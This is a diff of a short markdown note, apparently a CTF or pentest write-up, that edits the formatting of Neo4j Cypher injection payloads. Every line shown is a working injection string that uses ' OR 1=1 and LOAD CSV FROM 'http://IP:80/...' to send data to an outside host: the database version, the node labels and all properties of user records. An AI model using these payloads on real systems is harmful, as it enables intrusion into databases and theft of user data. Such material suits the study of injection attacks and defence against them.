@@ -67,13 +67,13 @@ search... found a database injection
 Version neo4j database
 
 ```sql
- OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://IP:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+ ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://IP:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
 ```
 
 Label
 
 
-```
+```sql
  ' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
 ```
 
@@ -82,7 +82,7 @@ Label
 User table 
 
 
-```
+```sql
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://IP:80/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
